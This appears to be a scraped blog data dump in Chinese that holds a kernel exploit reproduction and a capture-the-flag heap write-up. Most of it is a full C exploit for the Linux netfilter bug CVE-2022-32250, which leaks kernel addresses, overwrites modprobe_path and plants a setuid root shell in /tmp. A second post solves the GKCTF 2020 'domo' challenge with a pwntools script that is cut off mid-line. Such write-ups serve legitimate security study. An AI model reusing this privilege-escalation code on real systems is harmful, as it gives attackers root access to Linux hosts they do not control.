prefix[PREFIX_BUF_LEN];    uint8_t rcu_buf[RCU_HEAD_LEN];    unsigned short len;&#125;;struct leak &#123;    long kaslr_base;    long physmap_base;&#125;;struct fd_uring &#123;    int fd;    struct io_uring_params *params;&#125;;typedef int32_t key_serial_t;const char priv_file[] = &quot;/tmp/shell.c\\0&quot;;const char dummy_file[] = &quot;/tmp/dummy\\0&quot;;const char priv_context[] = &quot;#include &lt;stdio.h&gt;\\n#include &lt;stdlib.h&gt;\\n#include &lt;unistd.h&gt;\\n\\nint main(int argc, char **argv)&#123;if (geteuid() == 0)&#123;setuid(0);setgid(0);puts(\\&quot;[+] I am root\\&quot;);system(\\&quot;bash\\&quot;);&#125;&#125;\\x00&quot;;const char dummy_content[] = &quot;\\xff\\xff\\xff\\xff&quot;;const char new_modprobe_content[] = &quot;#!/bin/bash\\n\\nchown root:root /tmp/shell\\nchmod 4555 /tmp/shell\\n&quot;;static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) &#123;    return syscall(__NR_add_key, type, description, payload, plen, ringid);&#125;static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) &#123;    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);&#125;void bye(char *info)&#123;    puts(info);    exit(-2);&#125;void do_error_exit(char *info)&#123;    puts(info);    exit(-1);&#125;void bye2(char *info, char *arg)&#123;    printf(info, arg);&#125;key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size) &#123;    char key_desc[KEY_DESC_MAX_SIZE];    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));    if (id_buffer == NULL)        bye(&quot;calloc&quot;);    for (uint32_t i = start; i &lt; start+spray_size; i++) &#123;        snprintf(key_desc, KEY_DESC_MAX_SIZE, &quot;SPRAY-RING-%03du&quot;, i);        id_buffer[i] = add_key(&quot;user&quot;, key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);        if (id_buffer[i] &lt; 0)            bye(&quot;add_key&quot;);    &#125;    return id_buffer;&#125;key_serial_t *spray_keyring_list_del_purpose(uint32_t spray_size, uint64_t next, uint64_t prev, uint64_t size)&#123;    // next[0x8] = prev, prev[0x0] = next allocation occured at gather mqueue    char key_desc[KEY_DESC_MAX_SIZE];    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));    char temp[0x20];    memcpy(temp+0x0, &amp;next, 8);    memcpy(temp+0x8, &amp;prev, 8);    memcpy(temp+0x10, &quot;12341234&quot;, 8);    memcpy(temp+0x18, &amp;size, 8);    if (id_buffer == NULL)        do_error_exit(&quot;calloc&quot;);    for (uint32_t i = 0; i &lt; spray_size; i++) &#123;        id_buffer[i] = add_key(&quot;user&quot;, temp, temp, 0x20, KEY_SPEC_PROCESS_KEYRING);        if (id_buffer[i] &lt; 0)            do_error_exit(&quot;add_key&quot;);    &#125;    return id_buffer;&#125;key_serial_t *spray_keyring_list_overwrite_purpose(uint32_t spray_size, uint64_t len, uint64_t off_18,                                                     uint64_t off_20, uint64_t off_28, uint64_t off_30, uint64_t off_38)&#123;    char key_desc[KEY_DESC_MAX_SIZE];    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));    char temp[0x40];    switch((len-1)/8)    &#123;        case 0:            memcpy(temp+0x0, &amp;off_18, 8);        case 1:            memcpy(temp+0x8, &amp;off_20, 8);        case 2:            memcpy(temp+0x10, &amp;off_28, 8);        case 3:            memcpy(temp+0x18, &amp;off_30, 8);        case 4:            memcpy(temp+0x20, &amp;off_38, 8);            break;        default:            bye(&quot;add_key - assert(len &lt;= 0x28)&quot;);    &#125;    for (uint32_t i = 0; i &lt; spray_size; i++) &#123;        snprintf(key_desc, KEY_DESC_MAX_SIZE, temp);        id_buffer[i] = add_key(&quot;user&quot;, temp, temp, len, KEY_SPEC_PROCESS_KEYRING);        if (id_buffer[i] &lt; 0)            do_error_exit(&quot;add_key&quot;);    &#125;    return id_buffer;&#125;int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) &#123;        uint8_t buffer[USHRT_MAX] = &#123;0&#125;;    int32_t keylen;    for (uint32_t i = 0; i &lt; id_buffer_size; i++) &#123;        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, 0x10, 0);        if (keylen &lt; 0)            bye(&quot;keyctl&quot;);        if(!strncmp(&amp;buffer[6],&quot;\\xff\\xff&quot;, 2))        &#123;            heap_base = *((uint64_t*)buffer);            printf(&quot;[+] leak successed, kmalloc-64 heap: 0x%llx\\n&quot;, heap_base);            return i;        &#125;        else            printf(&quot;[-] leak failed, idkval: %s\\n&quot;, buffer);    &#125;    return id_buffer_size;&#125;void awake_partial_keys(key_serial_t *id_buffer, uint32_t idx) &#123;    uint8_t buffer[USHRT_MAX] = &#123;0&#125;;    int32_t keylen;    keylen = keyctl(KEYCTL_UPDATE, id_buffer[idx], (long)buffer, 0x10, 0);&#125;void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) &#123;        for (uint32_t i = 0; i &lt; id_buffer_size; i++) &#123;        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) &lt; 0)            do_error_exit(&quot;keyctl(KEYCTL_REVOKE)&quot;);    &#125;    free(id_buffer);&#125;void release_partial_keys(key_serial_t *id_buffer, int i) &#123;    if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) &lt; 0)        do_error_exit(&quot;keyctl(KEYCTL_REVOKE)&quot;);&#125;void unshare_setup(uid_t uid, gid_t gid)&#123;    int temp;    char edit[0x100];    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);    temp = open(&quot;/proc/self/setgroups&quot;, O_WRONLY);    write(temp, &quot;deny&quot;, strlen(&quot;deny&quot;));    close(temp);    temp = open(&quot;/proc/self/uid_map&quot;, O_WRONLY);    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, uid);    write(temp, edit, strlen(edit));    close(temp);    temp = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);    snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, gid);    write(temp, edit, strlen(edit));    close(temp);    return;&#125;void set_stable_table_and_set(struct mnl_socket* nl, const char *name)&#123;    char * table_name = name;    char * set_name = NULL;    uint8_t family = NFPROTO_IPV4;    uint32_t set_id = 1;    // a table for the sets to be associated with    struct nftnl_table * table = nftnl_table_alloc();    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);    struct nftnl_set * set_stable =  nftnl_set_alloc();    set_name = &quot;set_stable&quot;;    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);    // expressions    struct nftnl_expr * exprs[128];    int exprid = 0;    // serialize    char buf[MNL_SOCKET_BUFFER_SIZE*2];    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));    int seq = 0;    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);    mnl_nlmsg_batch_next(batch);    struct nlmsghdr * nlh;    int table_seq = seq;    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);    nftnl_table_nlmsg_build_payload(nlh, table);    mnl_nlmsg_batch_next(batch);    // add set_stable    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),                                    NFT_MSG_NEWSET, family,                                    NLM_F_CREATE|NLM_F_ACK, seq++);    nftnl_set_nlmsg_build_payload(nlh, set_stable);    nftnl_set_free(set_stable);    mnl_nlmsg_batch_next(batch);    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);    mnl_nlmsg_batch_next(batch);    if (nl == NULL) &#123;        err(1, &quot;mnl_socket_open&quot;);    &#125;    printf(&quot;[+] setting stable %s and set\\n&quot;, table_name);    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),mnl_nlmsg_batch_size(batch)) &lt; 0) &#123;        err(1, &quot;mnl_socket_send&quot;);    &#125;&#125;void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)&#123;    char * table_name = name;    uint8_t family = NFPROTO_IPV4;    uint32_t set_id = 1;    struct nftnl_expr * exprs[128];    int exprid = 0;    struct nlmsghdr * nlh;    struct nftnl_set * set_trigger = nftnl_set_alloc();    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, 1);    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);    exprs[exprid] = nftnl_expr_alloc(&quot;lookup&quot;);    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, &quot;set_stable&quot;);    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);    nftnl_set_add_expr(set_trigger, exprs[exprid]);    exprid++;    char buf[MNL_SOCKET_BUFFER_SIZE*2];    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));    int seq = 0;    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);    mnl_nlmsg_batch_next(batch);    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),                                    NFT_MSG_NEWSET, family,                                    NLM_F_CREATE|NLM_F_ACK, seq++);    nftnl_set_nlmsg_build_payload(nlh, set_trigger);    nftnl_set_free(set_trigger);    mnl_nlmsg_batch_next(batch);    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);    mnl_nlmsg_batch_next(batch);    if (nl == NULL) &#123;        err(1, &quot;mnl_socket_open&quot;);    &#125;    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),mnl_nlmsg_batch_size(batch)) &lt; 0) &#123;        err(1, &quot;mnl_socket_send&quot;);    &#125;    printf(&quot;[+] triggering UAF set and overwrite *(prevchunk+0x18)\\n&quot;);&#125;void set_cpu_affinity(int cpu_n, pid_t pid) &#123;    cpu_set_t set;    CPU_ZERO(&amp;set);    CPU_SET(cpu_n, &amp;set);    if (sched_setaffinity(pid, sizeof(set), &amp;set) &lt; 0)        do_error_exit(&quot;sched_setaffinity&quot;);&#125;void spray_mqueue(mqd_t mqdes, char *msgptr, int spray_size)&#123;    char msgrv[BUFFER];\tunsigned rvprio, sdprio = 1;\tstruct timespec ts;\tint unresolved = 0;\tint priority = 0;    printf(&quot;[*] spraying mqueue...\\n&quot;);    for(int i=0; i&lt;spray_size; i++)        if (mq_send(mqdes, msgptr, 0x28, sdprio) != 0)            perror(ERROR_PREFIX &quot;mq_send&quot;);&#125;int gather_mqueue(mqd_t mqdes, int gather_size)&#123;    int priority = 0;    char msg[BUFFER];    printf(&quot;[*] gathering mqueue...\\n&quot;);    for(int i=0; i&lt;gather_size; i++)    &#123;        if (mq_receive(mqdes, (char*) &amp;msg, BUFFER, NULL) != -1)        &#123;               if(*((uint64_t *)msg) &amp; 0xffffffff00000000 != 0xffffffff00000000)                bye(&quot;[-] can&#x27;t leak base... \\n&quot;);            base_base = *((uint64_t *)msg) - 0x51af80;            modprobe_addr = base_base + 0x1e8b320;            printf(&quot;[+] KASLR base: 0x%llx\\n&quot;, base_base);            printf(&quot;[+] modprobe addr: 0x%llx\\n&quot;, modprobe_addr);        &#125;    &#125;    return 0;&#125;int gather_mqueue_nosave(mqd_t mqdes, int gather_size)&#123;    int priority = 0;    char msg[BUFFER];    printf(&quot;[*] gathering mqueue...\\n&quot;);    for(int i=0; i&lt;gather_size; i++)        mq_receive(mqdes, (char*) &amp;msg, BUFFER, NULL);    return 0;&#125;void spray_msg_msg(unsigned int size, unsigned int amount, int qid)&#123;    char buffer[0x2000];    msg *spray = (msg *)buffer;    // assert(size &gt;= 0x31 &amp;&amp; size &lt;= 0x1000 - 0x8);    printf(&quot;[*] try to spray msg_msg\\n&quot;);    spray-&gt;mtype = 1;    memset(spray-&gt;mtext, 0x41, size - 0x30);    for (int i = 0; i &lt; amount; i++)    &#123;        if(i % 0x10 == 0)            printf(&quot;[*] spraying msg_msg: 0x%x\\n&quot;, i);        if (msgsnd(qid, spray, size - 0x30, 0) == -1)        &#123;            perror(&quot;msgsend failure&quot;);            exit(-1);        &#125;    &#125;    return;&#125;static inline int io_uring_setup(uint32_t entries, struct io_uring_params *p) &#123;    return syscall(__NR_io_uring_setup, entries, p);&#125;static inline int io_uring_register(int fd, unsigned int opcode, void *arg, unsigned int nr_args) &#123;    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);&#125;struct fd_uring *spray_uring(uint32_t spray_size, struct fd_uring *fd_buffer) &#123;    for (uint64_t i = 0; i &lt; spray_size; i++) &#123;        fd_buffer[i].params = malloc(sizeof(struct io_uring_params));        if (!fd_buffer[i].params)            do_error_exit(&quot;malloc&quot;);        memset(fd_buffer[i].params, 0, sizeof(struct io_uring_params));        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);        if (fd_buffer[i].fd &lt; 0)            do_error_exit(&quot;io_uring_create&quot;);    &#125;    return fd_buffer;&#125;void release_uring(struct fd_uring *fd_buffer, uint32_t buffer_size) &#123;    for (uint32_t i = 0; i &lt; buffer_size; i++) &#123;        close(fd_buffer[i].fd);    &#125;    free(fd_buffer);&#125;void release_partial_uring(struct fd_uring *fd_buffer, uint32_t buffer_idx) &#123;    close(fd_buffer[buffer_idx].fd);&#125;void prepare_root_shell(void) &#123;    create_dummy_file();    create_priv_file();&#125;void create_dummy_file(void) &#123;    int fd;    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);    write(fd, dummy_content, sizeof(dummy_content));    close(fd);&#125;void create_priv_file(void) &#123;    int fd;    fd = open(priv_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);    write(fd, priv_context, sizeof(priv_context));    close(fd);    system(&quot;gcc -o /tmp/shell /tmp/shell.c -w&quot;);&#125;void write_new_modprobe() &#123;    int fd, fd_modprobe;    char modprobe_name[0x10] = &#123;0, &#125;;    fd_modprobe = open(&quot;/proc/sys/kernel/modprobe&quot;, O_RDONLY);    read(fd_modprobe, modprobe_name, 14);    close(fd_modprobe);        printf(&quot;[*] current modprobe name: %s\\n&quot;, modprobe_name);    fd = open(modprobe_name, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);    if (fd &lt; 0)        do_error_exit(&quot;open&quot;);    write(fd, new_modprobe_content, sizeof(new_modprobe_content));    close(fd);&#125;void setup_modprobe_payload() &#123;    write_new_modprobe();&#125;void userland_T(int *sema)&#123;    while(*sema);&#125;void sema_up(int *sema)&#123;    *sema = 1;&#125;void sema_down(int *sema)&#123;    *sema = 0;&#125;int main(int argc, char ** argv)&#123;    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);    char c;    char writebuf[0x2000];    char mqname[MQUEUE_NUM][NAMELEN] = &#123;&quot;/qname1&quot;, &quot;/qname2&quot;, &quot;/qname3&quot;, &quot;/qname4&quot;, &quot;/qname5&quot;&#125;;    mqd_t mqid[MQUEUE_NUM];    struct mq_attr attr;\tattr.mq_flags   = 0;\tattr.mq_maxmsg  = 10;\tattr.mq_msgsize = BUFFER;\tattr.mq_curmsgs = 0;    int uaf_id = 0;    int *sema = mmap(NULL, sizeof(int), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);    int *sema2 = malloc(0x10);    prepare_root_shell();    sema_up(sema);    if(fork())    &#123;        set_cpu_affinity(1, getpid());        userland_T(sema);        sleep(1);        printf(&quot;\\n\\n[------------------------- stage 4: Execute Malicious File -------------------------------]\\n&quot;);        setup_modprobe_payload();        execve(&quot;/tmp/dummy&quot;, NULL, NULL);        execve(&quot;/tmp/shell&quot;, NULL, NULL);    &#125;    unshare_setup(getuid(), getgid());    set_cpu_affinity(0, 0);    struct fd_uring *fd_buffer = calloc(SPRAY_SIZE, sizeof(struct fd_uring));    if (!fd_buffer)        do_error_exit(&quot;calloc&quot;);    for(int i=0; i&lt;5; i++)        if((mqid[i] = mq_open(mqname[i], O_CREAT | O_RDWR, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH, &amp;attr)) &lt; 0)            bye(&quot;MQUEUE&quot;);        struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);    printf(&quot;\\n\\n[------------------------- stage 0: Allocate stable table and set ------------------------]\\n&quot;);    set_stable_table_and_set(nl, &quot;table1&quot;);    set_stable_table_and_set(nl, &quot;table2&quot;);    set_stable_table_and_set(nl, &quot;table3&quot;);    set_stable_table_and_set(nl, &quot;table4&quot;);    printf(&quot;\\n\\n[------------------------- stage 1: Leak heap address ------------------------------------]\\n&quot;);    set_trigger_set_and_overwrite(nl, &quot;table1&quot;, &quot;set_trigger0&quot;);        key_serial_t *id_buffer = spray_keyring(0, SPRAY_KEY_SIZE);    set_trigger_set_and_overwrite(nl, &quot;table1&quot;, &quot;set_trigger1&quot;);    if((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)        bye(&quot;[-] leak failed...&quot;);    printf(&quot;\\n\\n[------------------------- stage 2: Leak KASLR address -----------------------------------]\\n&quot;);        spray_uring(SPRAY_SIZE, fd_buffer);    set_trigger_set_and_overwrite(nl, &quot;table2&quot;, &quot;set_trigger2&quot;);    spray_mqueue(mqid[0], &quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;, 4);    release_partial_uring(fd_buffer, SPRAY_SIZE-1);    for(int i = 3; i &gt; 113; i++)        release_partial_uring(fd_buffer, SPRAY_SIZE-i);    release_partial_uring(fd_buffer, SPRAY_SIZE-2);    set_trigger_set_and_overwrite(nl, &quot;table2&quot;, &quot;set_trigger3&quot;);    key_serial_t *id_buffer3 = spray_keyring_list_del_purpose(SPRAY_KEY_SIZE*2, heap_base, heap_base, 0x28);// keyring &lt;-&gt; msg_msg overlap    gather_mqueue(mqid[0], 1);    sleep(1);    printf(&quot;\\n\\n[------------------------- stage 3: Overwrite modprobe_path ------------------------------]\\n&quot;);    set_trigger_set_and_overwrite(nl, &quot;table3&quot;, &quot;set_trigger4&quot;);    spray_mqueue(mqid[1], &quot;TESTMSGTESTMSGTESTMSGTESTMSGTESTMSG&quot;, 4);    set_trigger_set_and_overwrite(nl, &quot;table3&quot;, &quot;set_trigger5&quot;);    id_buffer = spray_keyring_list_del_purpose(1, modprobe_addr-0x8+0x1, (heap_base&amp;0xffffffff00000000)+0x2f706d74, 0x10);    sema_down(sema);    gather_mqueue_nosave(mqid[1], 1);    sleep(1);    for(int i=SPRAY_SIZE/2+12; i&lt;SPRAY_SIZE; i++)        release_partial_uring(fd_buffer, i);    while(1);&#125;\n\n这里也用了io_uring，不过我看其申请的参数其实是GFP_KERNEL_ACCOUNT，不明白为什么这里又可以进行占位了( 有种自相矛盾的感觉 )。\n\n参考链接:\n​    https://blog.theori.io/linux-kernel-exploit-cve-2022-32250-with-mqueue-a8468f32aab5\n​    https://github.com/theori-io/CVE-2022-32250-exploit\n","categories":["Linux Kernel","CVE复现"],"tags":["netfilter","io_uring","user_key_payload"]},{"title":"GKCTF_2020_domo","url":"/2022/02/10/GKCTF-2020-domo/","content":"复现一场比赛被第一道题卡了贼久，我太菜了，越学pwn越在想要是比赛第一题就是这个我连一道题都做不出来怎么办哦。\n吐槽: nss给的libc怎么也不对啊？\n\n简要分析__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+0h] [rbp-20h] BYREF  int v5; // [rsp+4h] [rbp-1Ch] BYREF  int v6; // [rsp+8h] [rbp-18h] BYREF  int v7; // [rsp+Ch] [rbp-14h] BYREF  __int64 v8; // [rsp+10h] [rbp-10h]  unsigned __int64 v9; // [rsp+18h] [rbp-8h]  v9 = __readfsqword(0x28u);  v4 = 1;  v5 = 1;  v6 = 1;  sub_BA0(a1, a2, a3);  sub_C9D();  puts(&quot;Welcome to GKCTF&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      while ( 1 )      &#123;        while ( 1 )        &#123;          menu();                               //   puts(&quot;1: Add a user&quot;);                                                //   puts(&quot;2: Delete a user&quot;);                                                //   puts(&quot;3: Show a user&quot;);                                                //   puts(&quot;4: Edit a user&quot;);                                                //   return puts(&quot;5: Exit&quot;);          printf(&quot;&gt; &quot;);          _isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( v7 != 1 )            break;          add(&quot;%d&quot;, &amp;v7);        &#125;        if ( v7 != 2 )          break;        delete(&quot;%d&quot;, &amp;v7);      &#125;      if ( v7 != 3 )        break;      show(&quot;%d&quot;, &amp;v7);    &#125;    if ( v7 != 4 )      break;    edit(&amp;v4, &amp;v5, &amp;v6);  &#125;  v8 = seccomp_init(2147418112LL);  seccomp_rule_add(v8, 0LL, 59LL, 0LL);  seccomp_rule_add(v8, 0LL, 4294957238LL, 0LL);  seccomp_rule_add(v8, 0LL, 10LL, 0LL);  seccomp_load(v8);  puts(&quot;oh,Bye&quot;);  return 0LL;&#125;\n\n在main内的最后开启了沙盒，可以看出来禁用了execve的调用。\nunsigned __int64 __fastcall sub_E6C(const char *a1)&#123;  size_t nbytes; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( check(a1) == 1 &amp;&amp; chunk_num[0] &lt;= 8 )  &#123;    HIDWORD(nbytes) = 0;    while ( SHIDWORD(nbytes) &lt;= 8 )    &#123;      if ( !*(&amp;chunk_arr + SHIDWORD(nbytes)) )      &#123;        puts(&quot;size:&quot;);        _isoc99_scanf(&quot;%d&quot;, &amp;nbytes);        if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 288 )        &#123;          *(&amp;chunk_arr + SHIDWORD(nbytes)) = malloc(nbytes);          puts(&quot;content:&quot;);          read(0, *(&amp;chunk_arr + SHIDWORD(nbytes)), nbytes);          *(*(&amp;chunk_arr + SHIDWORD(nbytes)) + nbytes) = 0;// off by null          ++chunk_num[0];        &#125;        else        &#123;          puts(&quot;sobig&quot;);        &#125;        return __readfsqword(0x28u) ^ v3;      &#125;      ++HIDWORD(nbytes);    &#125;  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n在add函数存在明显的off by null漏洞。\n__int64 sub_C16()&#123;  void *(*volatile v0)(size_t, const void *); // rax  bool v1; // dl  void (*volatile v2)(void *, const void *); // rax  v0 = _malloc_hook;  v1 = v0 != 0LL;  v2 = _free_hook;  if ( !v1 &amp;&amp; v2 == 0LL )    return 1LL;  puts(&quot;oh no&quot;);  return 0LL;&#125;\n\n在add函数和delete函数的开头部分都存在这个函数检验_malloc_hook和_free_hook是否被修改。所以常规的修改hook为one_gadget是不现实的了。\nunsigned __int64 __fastcall sub_115E(_DWORD *a1, _DWORD *a2, _DWORD *a3)&#123;  void *buf; // [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v6; // [rsp+28h] [rbp-8h]  v6 = __readfsqword(0x28u);  buf = 0LL;  if ( check() == 1 )  &#123;    if ( *a1 &amp;&amp; *a2 &amp;&amp; *a3 )    &#123;      puts(&quot;addr:&quot;);      _isoc99_scanf(&quot;%ld&quot;, &amp;buf);      puts(&quot;num:&quot;);      read(0, buf, 1uLL);      *a1 = 0;      *a2 = 0;      *a3 = 0;      puts(&quot;starssgo need ten girl friend &quot;);    &#125;    else    &#123;      puts(&quot;You no flag&quot;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v6;&#125;\n\n这里的edit函数和常规完全不一样，这里是存在一个任意地址写一字节并且只允许执行一次。\n利用过程leak libc addr当unsortedbin只有一个chunk的时候它的fd指针和bk指针都是指向main_arena的。\n\n然后申请一个同样大小的chunk并且输入b’a’*7+b’\\n’\n\n即可获得main_arena的地址，然后计算出libc_base的地址。\nleak heap addr利用思路跟上面类似，不过是用fastbin。\n\n此时他的fd指针指向的是他下一个chunk。申请一个size相同并且输入空字符即可求出heap的地址。\nchunk overlap接着就是利用堆的堆放方式利用off by null触发unlink为fastbin attack做准备。\ncreate(0x40, b&#x27;&#x27;)create(0x68, b&#x27;&#x27;)create(0xf0, b&#x27;&#x27;)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))delete(2)\n\n\n我们使用以上三个chunk来进行，并且在chunk0的里面我们伪造一个size为0xb0的fake chunk。\n\n可以看到经过上面我们已经修改了size为0x100的inuse位的值0，那么此时我们free掉它。\n\n可以看到此时我们伪造的fake chunk的size已经变为了0x1b1\n\n并且可以看到unlink后的fake chunk已经进入了unsorted bin了。\nvtable在进行fastbin attack之前我们先先看看vtable是个什么东西\n\n可以看到下面的vtable变量，存放的值是_IO_file_jumps的指针\n\n可以看到_IO_file_jumps结构内存放很多函数的指针，一系列标准IO函数都会调用这些指针，但是_IO_file_jumps结构本身是不可写的，但是我们可以修改vtable指向我们伪造的_IO_file_jumps结构。\nfastbin attackcreate(0xc0, b&#x27;&#x27;)delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  create(0xa8, p64(0)*2+p64(one_gadget)*19)\n\n首先申请一个size为0xc0的chunk，而这个chunk会在unsorted bin当中的fake chunk中割出一部分拿给我们。所以我们可以通过这样一个chunk来修改我们放到fastbin当中的chunk。\n先看_IO_2_1_stdin_附近适合用来构造fake chunk的地方。\n\n可以看到这个位置是很适合拿来做chunk的size的也就是_IO_2_1_stdin_+160-3\n\n可以看到fastbin当中的chunk被我们改变了到了制定位置，然后伪造vtable也在了，最后修改getshell即可\n综上得出expfrom pwn import *r = process(&#x27;./domo&#x27;)elf = ELF(&#x27;./domo&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)def create(size, content):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.sendline(content)def delete(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def show(index):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;index:&#x27;)    r.sendline(bytes(str(index), encoding=&#x27;utf-8&#x27;))def edit(address, num):    r.recvuntil(b&#x27;5: Exit&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;addr:&#x27;)    r.senline(bytes(str(address), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;num:&#x27;)    r.sendline(bytes(str(num), encoding=&#x27;utf-8&#x27;))create(0x40, b&#x27;&#x27;)  # 0create(0x68, b&#x27;&#x27;)  # 1create(0xf0, b&#x27;&#x27;)  # 2create(0x10, b&#x27;&#x27;)  # 3delete(2)create(0xf0, b&#x27;a&#x27;*7)  # 2show(2)print(r.recvuntil(b&#x27;\\n&#x27;))print(r.recvuntil(b&#x27;a\\n&#x27;))main_arena_88 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = 0xf03a4+libc_baseprint(hex(one_gadget))create(0x10, b&#x27;&#x27;)  # 4delete(3)delete(4)create(0x10, b&#x27;&#x27;)  # 3show(3)print(r.recvuntil(b&#x27;\\n&#x27;))heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x10a+0x10info(hex(heap_addr))delete(3)delete(0)create(0x40, p64(0)+p64(0xb1)+p64(heap_addr+0x18) +       p64(heap_addr+0x20)+p64(heap_addr+0x10))  # 0delete(1)create(0x68, b&#x27;\\x00&#x27;*0x60+p64(0xb0))  # 1delete(2)create(0xc0, b&#x27;&#x27;)  # 2delete(1)delete(2)_IO_2_1_stdin_ = libc_base+libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]info(hex(_IO_2_1_stdin_))fake_chunk = _IO_2_1_stdin_+160-3create(0xc0, b&#x27;a&#x27;*0x38+p64(0x71)+p64(fake_chunk))  # 2create(0xa8, p64(0)*2+p64(one_gadget)*19)  # 1create(0x60, b&#x27;&#x27;)fake_vtable = heap_addr+0xf0payload = b&#x27;\\x00&#x27;*3 + p64(0)*2+p64(0x00000000ffffffff)+p64(0) * \\    2+p64(fake_vtable)+p64(0)*6create(0x63, 